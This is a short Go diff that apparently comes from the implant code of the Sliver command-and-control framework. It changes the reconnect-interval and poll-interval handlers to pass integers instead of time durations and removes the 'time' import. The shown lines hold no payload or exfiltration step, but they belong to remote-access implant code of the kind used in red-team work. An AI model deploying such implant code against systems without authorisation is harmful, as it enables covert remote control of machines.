@@ -28,7 +28,6 @@ import (
 	"io/ioutil"
 	"os/exec"
 	"strings"
-	"time"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -465,7 +464,7 @@ func reconnectIntervalHandler(data []byte, resp RPCResponse) {
 	// {{end}}
 
 	// Set the reconnect interval value
-	transports.SetReconnectInterval(time.Duration(reconnectInterval) * time.Second)
+	transports.SetReconnectInterval(int(reconnectInterval))
 
 	recIntervalResp := &sliverpb.ReconnectInterval{}
 	recIntervalResp.Response = &commonpb.Response{}
@@ -493,7 +492,7 @@ func pollIntervalHandler(data []byte, resp RPCResponse) {
 	// {{end}}
 
 	// Set the reconnect interval value
-	transports.SetPollInterval(time.Duration(pollInterval) * time.Second)
+	transports.SetPollInterval(int(pollInterval))
 
 	pollIntervalResp := &sliverpb.PollInterval{}
 	pollIntervalResp.Response = &commonpb.Response{}
